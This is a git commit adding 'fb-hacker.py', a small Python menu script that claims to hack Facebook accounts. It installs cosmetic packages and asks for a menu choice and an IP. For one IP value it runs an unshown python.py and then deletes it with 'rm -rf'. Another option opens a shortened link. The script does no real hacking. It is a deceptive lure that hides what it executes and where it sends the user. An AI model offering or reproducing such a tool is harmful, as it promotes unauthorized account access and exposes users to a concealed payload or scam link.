b52b4dd3f9172cf328dab120842cafb862d193a4
FananX9-2 <85710756+FananX9-2@users.noreply.github.com>
2021-08-24 17:04:50 +0100

    Add files via upload

---
+++ fb-hacker.py
@@ -0,0 +1,28 @@
+import os
+os.system ('pkg install cmatrix -y')
+os.system ('clear')
+os.system ('pkg install figlet -y')
+os.system ('clear')
+os.system ('figlet Fb-hacker-P')
+print ("")
+print ("")
+print ('\033[1;32m{1}\033[1;33m Hacker facebook')
+print ("")
+print ('\033[1;32m{2}\033[1;33m Hacker facebook')
+print ("")
+print ('\033[1;32mFor Example, Choose a Number \033[1;31m1,2,')
+v7x2 = input (" \033[1;33mhacker\033[1;31m==> ")
+if v7x2 == '1' :
+        os.system ('clear')
+        print ('')
+        print ("Loading..........!")
+        os.system ('figlet Hk facebook')
+fx9 = input (" \033[1;33mIP ==> ")
+if fx9 == '69.171.250.35' :
+        os.system ('python python.py')
+        os.system ('rm -rf python.py')
+if v7x2 == '2' :
+        os.system('xdg-open https://shortest.link/HLw')
+
+
+
